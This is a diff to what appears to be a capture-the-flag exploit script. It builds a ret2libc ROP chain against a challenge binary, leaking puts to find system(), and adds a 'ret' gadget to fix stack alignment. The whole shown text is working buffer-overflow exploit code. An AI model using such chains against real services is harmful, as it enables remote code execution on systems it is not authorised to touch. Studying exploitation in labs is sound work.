@@ -13,6 +13,7 @@ PROMPT = '이름을 입력하세요: '.encode()
 WELCOME = '환영합니다\n'.encode()
 
 POP_RDI_RET = 0x401156   # nm files/winlibc | grep pop_rdi_ret
+RET_GADGET = 0x401157    # objdump -d files/winlibc: the `ret` byte right after pop_rdi_ret's `pop rdi`
 MAIN = 0x40115B          # nm files/winlibc | grep ' main$'
 PUTS_GOT = 0x404000      # readelf -r files/winlibc | grep puts
 PUTS_PLT = 0x401030      # objdump -d files/winlibc | grep '<puts@plt>:'
@@ -80,8 +81,14 @@ def main():
         libc_base = leaked_puts - puts_offset
         system_addr = libc_base + system_offset
 
+        # system() internally reaches SSE instructions that require the stack
+        # to be 16-byte aligned at entry; the plain pop-rdi/ret chain lands
+        # one qword short of that on real hardware (this only happened to
+        # work under this machine's emulated amd64, which does not enforce
+        # the alignment fault the same way). One extra bare `ret` absorbs the
+        # missing qword without disturbing rdi.
         exploit_chain = (b'A' * FILLER + p64(POP_RDI_RET) + p64(CMD_ADDR)
-                          + p64(system_addr))
+                          + p64(RET_GADGET) + p64(system_addr))
         sock.sendall(exploit_chain)
         sock.shutdown(socket.SHUT_WR)
 
